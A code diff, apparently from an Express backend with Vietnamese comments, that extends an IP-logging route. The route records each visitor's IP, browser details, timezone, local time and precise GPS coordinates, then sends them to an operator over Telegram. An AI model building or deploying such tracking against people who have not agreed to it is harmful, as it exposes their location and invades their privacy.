@@ -25,7 +25,28 @@ router.post('/log-ip', async (req, res) => {
         const referrer = req.body.referrer || req.headers['referer'] || '';
 
         // Lấy thời gian hiện tại
-        const time = new Date();
+        let time;
+        let clientTimeFormatted = '';
+
+        // Ưu tiên sử dụng thời gian địa phương của client nếu có
+        if (req.body.localTime) {
+            clientTimeFormatted = req.body.localTime;
+        }
+
+        // Nếu client gửi timestamp, dùng timestamp đó để có thời gian chính xác của client
+        if (req.body.timestamp) {
+            try {
+                time = new Date(req.body.timestamp);
+                // Kiểm tra nếu thời gian không hợp lệ thì dùng thời gian máy chủ
+                if (isNaN(time.getTime())) {
+                    time = new Date();
+                }
+            } catch {
+                time = new Date();
+            }
+        } else {
+            time = new Date();
+        }
 
         // Tạo bản ghi log với thông tin mở rộng từ client
         const ipLog = new IPLog({
@@ -54,6 +75,9 @@ router.post('/log-ip', async (req, res) => {
             // Lưu các thông tin khác vào clientInfo
             clientInfo: {
                 timestamp: req.body.timestamp,
+                localTime: req.body.localTime,
+                timezoneOffset: req.body.timezoneOffset,
+                positionTimestamp: req.body.positionTimestamp,
                 ...req.body // Lưu tất cả dữ liệu khác từ client
             }
         });
@@ -66,6 +90,11 @@ router.post('/log-ip', async (req, res) => {
         if (req.body.referrer) extraInfo.push(`📤 Nguồn: ${req.body.referrer}`);
         if (req.body.language) extraInfo.push(`🌐 Ngôn ngữ: ${req.body.language}`);
         if (req.body.timeZone) extraInfo.push(`🕒 Múi giờ: ${req.body.timeZone}`);
+
+        // Thêm thời gian địa phương của client nếu có
+        if (clientTimeFormatted) {
+            extraInfo.push(`⏱️ Thời gian địa phương: ${clientTimeFormatted}`);
+        }
 
         // Xử lý tọa độ từ client (có độ chính xác cao hơn IP lookup)
         if (req.body.latitude && req.body.longitude) {
@@ -86,6 +115,24 @@ router.post('/log-ip', async (req, res) => {
                 // Thêm thông tin độ chính xác nếu có
                 if (req.body.accuracy && !isNaN(req.body.accuracy)) {
                     extraInfo.push(`📏 Độ chính xác: ${Math.round(req.body.accuracy)} mét`);
+                }
+
+                // Thêm thời gian lấy tọa độ nếu có
+                if (req.body.positionTimestamp) {
+                    try {
+                        const posTime = new Date(req.body.positionTimestamp);
+                        if (!isNaN(posTime.getTime())) {
+                            const posTimeStr = posTime.toLocaleString('vi-VN', {
+                                hour: '2-digit',
+                                minute: '2-digit',
+                                second: '2-digit',
+                                hour12: false
+                            });
+                            extraInfo.push(`⌚ Tọa độ lấy lúc: ${posTimeStr}`);
+                        }
+                    } catch {
+                        // Bỏ qua nếu không thể parse timestamp
+                    }
                 }
             }
         }
@@ -114,9 +161,10 @@ router.post('/log-ip', async (req, res) => {
         }
 
         // Gửi thông báo qua Telegram với thông tin nâng cao
+        // Truyền đối tượng time thay vì chuỗi để định dạng theo múi giờ Việt Nam
         sendIPNotification(
             ip,
-            time.toLocaleString('vi-VN'),
+            time, // Truyền trực tiếp đối tượng Date thay vì chuỗi đã định dạng
             userAgent,
             path,
             extraInfo.join('\n')
